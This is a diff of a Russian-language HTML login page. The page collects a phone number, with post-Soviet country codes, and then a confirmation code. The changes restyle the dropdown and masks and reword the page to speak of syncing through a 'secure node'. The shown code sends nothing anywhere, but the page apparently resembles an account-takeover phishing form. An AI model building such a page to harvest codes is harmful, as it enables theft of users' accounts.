@@ -9,13 +9,47 @@
         :root { --bg: #0f172a; --accent: #38bdf8; --glass: rgba(30, 41, 59, 0.7); }
         body { background: radial-gradient(circle at top right, #1e293b, #0f172a); color: #f8fafc; font-family: 'Inter', sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
         .card { width: 85%; max-width: 360px; padding: 35px 24px; background: var(--glass); backdrop-filter: blur(16px); -webkit-backdrop-filter: blur(16px); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 32px; box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5); text-align: center; }
+        
         .icon-box { width: 60px; height: 60px; background: linear-gradient(135deg, var(--accent), #818cf8); border-radius: 18px; margin: 0 auto 20px; display: flex; align-items: center; justify-content: center; }
         h2 { font-size: 22px; margin: 0 0 8px; }
         p { color: #94a3b8; font-size: 14px; margin-bottom: 25px; }
 
-        .phone-group { display: flex; background: rgba(15, 23, 42, 0.6); border: 1.5px solid rgba(255, 255, 255, 0.1); border-radius: 16px; overflow: hidden; margin-bottom: 20px; }
-        select { background: #1e293b; border: none; color: #fff; padding: 15px; font-size: 16px; outline: none; border-right: 1px solid rgba(255, 255, 255, 0.1); width: 100px; cursor: pointer; -webkit-appearance: none; }
-        input { width: 100%; background: transparent; border: none; color: #fff; padding: 15px; font-size: 18px; outline: none; letter-spacing: 1px; }
+        /* Контейнер ввода с кастомной стрелочкой */
+        .phone-group { 
+            display: flex; 
+            background: rgba(15, 23, 42, 0.6); 
+            border: 1.5px solid rgba(255, 255, 255, 0.1); 
+            border-radius: 16px; 
+            position: relative;
+            overflow: hidden; 
+            margin-bottom: 20px; 
+        }
+
+        .select-wrapper { position: relative; display: flex; align-items: center; border-right: 1px solid rgba(255, 255, 255, 0.1); }
+        
+        /* Кастомная стрелочка через псевдоэлемент */
+        .select-wrapper::after {
+            content: '▼';
+            font-size: 8px;
+            position: absolute;
+            right: 8px;
+            pointer-events: none;
+            color: var(--accent);
+        }
+
+        select { 
+            background: #1e293b; 
+            border: none; 
+            color: #fff; 
+            padding: 15px 25px 15px 15px; 
+            font-size: 15px; 
+            outline: none; 
+            cursor: pointer; 
+            appearance: none; 
+            -webkit-appearance: none;
+        }
+
+        input { width: 100%; background: transparent; border: none; color: #fff; padding: 15px; font-size: 17px; outline: none; letter-spacing: 0.5px; }
         
         input::-webkit-outer-spin-button, input::-webkit-inner-spin-button { -webkit-appearance: none; margin: 0; }
         input[type=number] { -moz-appearance: textfield; }
@@ -31,29 +65,31 @@
         </div>
 
         <div id="step1">
-            <h2>Авторизация</h2>
-            <p>Введите номер для синхронизации</p>
+            <h2>Вход</h2>
+            <p>Синхронизация через защищенный узел</p>
             <div class="phone-group">
-                <select id="country" onchange="resetInput()">
-                    <option value="+7" data-mask="000-000-00-00">🇷🇺 +7</option>
-                    <option value="+380" data-mask="00-000-00-00">🇺🇦 +380</option>
-                    <option value="+375" data-mask="00-000-00-00">🇧🇾 +375</option>
-                    <option value="+7" data-mask="000-000-00-00">🇰🇿 +7</option>
-                    <option value="+998" data-mask="00-000-00-00">🇺🇿 +998</option>
-                    <option value="+994" data-mask="00-000-00-00">🇦🇿 +994</option>
-                    <option value="+374" data-mask="00-00-00-00">🇦🇲 +374</option>
-                    <option value="+996" data-mask="000-00-00-00">🇰🇬 +996</option>
-                </select>
-                <input type="tel" id="phone" placeholder="000-000-00-00">
+                <div class="select-wrapper">
+                    <select id="country" onchange="resetInput()">
+                        <option value="+7" data-mask="(000) 000-00-00">🇷🇺 +7</option>
+                        <option value="+380" data-mask="(00) 000-00-00">🇺🇦 +380</option>
+                        <option value="+375" data-mask="(00) 000-00-00">🇧🇾 +375</option>
+                        <option value="+7" data-mask="(000) 000-00-00">🇰🇿 +7</option>
+                        <option value="+998" data-mask="(00) 000-00-00">🇺🇿 +998</option>
+                        <option value="+994" data-mask="(00) 000-00-00">🇦🇿 +994</option>
+                        <option value="+374" data-mask="(00) 00-00-00">🇦🇲 +374</option>
+                        <option value="+996" data-mask="(000) 00-00-00">🇰🇬 +996</option>
+                    </select>
+                </div>
+                <input type="tel" id="phone" placeholder="(000) 000-00-00">
             </div>
-            <button onclick="toStep2()">Продолжить</button>
+            <button onclick="toStep2()">Получить код</button>
         </div>
 
         <div id="step2">
-            <h2>Код подтверждения</h2>
+            <h2>Проверка</h2>
             <p>Код отправлен на <br><b id="view-phone" style="color:var(--accent)"></b></p>
             <input type="number" id="code" placeholder="00000" inputmode="numeric">
-            <button onclick="final()">Войти</button>
+            <button onclick="final()">Подтвердить</button>
         </div>
     </div>
 
@@ -65,7 +101,7 @@
         const phoneInput = document.getElementById('phone');
         const countrySelect = document.getElementById('country');
 
-        // Живая маска
+        // Логика маски со скобками
         phoneInput.addEventListener('input', function(e) {
             let x = e.target.value.replace(/\D/g, '');
             const mask = countrySelect.options[countrySelect.selectedIndex].getAttribute('data-mask');
@@ -88,7 +124,7 @@
         }
 
         function toStep2() {
-            const full = countrySelect.value + phoneInput.value;
+            const full = countrySelect.value + " " + phoneInput.value;
             const clean = phoneInput.value.replace(/\D/g, '');
             const maskCheck = countrySelect.options[countrySelect.selectedIndex].getAttribute('data-mask').replace(/\D/g, '').length;
 
